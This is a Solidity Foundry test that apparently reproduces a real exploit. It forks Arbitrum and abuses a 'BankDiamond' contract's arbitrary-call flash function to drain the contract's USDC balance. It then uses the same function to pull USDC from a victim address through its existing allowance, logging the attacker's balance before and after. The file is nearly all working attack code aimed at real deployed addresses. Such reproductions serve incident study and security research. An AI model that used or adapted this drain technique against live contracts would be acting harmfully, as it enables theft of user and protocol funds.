// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../src/interface.sol";

import "forge-std/Test.sol";
import "forge-std/console.sol";

// Interface
interface IBankDiamond {
    function flash(address, bytes calldata) external returns (bytes memory result);
}

contract RICOTest is Test {
    // Environment Configuration
    uint256 constant forkBlock = 202_973_712;
    address constant fundToken = address(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);

    // Variable
    address constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    address constant BankDiamond = 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b;
    address constant Router = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address constant Victim = 0x512E07A093aAA20Ba288392EaDF03838C7a4e522;

    // Modifier
    modifier BalanceLog() {
        console.log("Attacker Token Balance Before Exploit: ", getBalance(fundToken));
        _;
        console.log("Attacker Token Balance After Exploit: ", getBalance(fundToken));
    }

    // Balance Log
    function getBalance(address token) internal view returns (uint256) {
        if (token == address(0)) return address(this).balance;
        return IERC20(token).balanceOf(address(this));
    }

    // Environment Setup
    function setUp() public {
        vm.createSelectFork("arbitrum", forkBlock);
        vm.deal(address(this), 0);

        vm.label(USDC, "USDC");
        vm.label(BankDiamond, "BankDiamond");
        vm.label(Router, "Router");
        vm.label(Victim, "Victim");
    }

    function testExploit() public BalanceLog {
        address token = USDC;
        IBankDiamond(BankDiamond).flash(token, _getTransferData(token));

        transferFromOwner(Victim, USDC);
    }

    function _getTransferData(address token) internal view returns (bytes memory data) {
        uint256 tokenBalance = IERC20(token).balanceOf(BankDiamond);
        data = abi.encodeWithSelector(IERC20.transfer.selector, address(this), tokenBalance);
    }

    function transferFromOwner(address owner, address token) internal {
        bytes memory callData = _getTransferFromData(token, owner);
        if (callData.length > 0) {
            IBankDiamond(BankDiamond).flash(token, callData);
        }
    }

    function _getTransferFromData(address token, address user) internal view returns (bytes memory data) {
        uint256 tokenBalance = IERC20(token).balanceOf(BankDiamond);
        uint256 tokenAllowance = IERC20(token).allowance(user, BankDiamond);
        if (tokenBalance >= tokenAllowance) {
            data = abi.encodeWithSelector(IERC20.transferFrom.selector, user, address(this), tokenBalance);
        }
    }
}
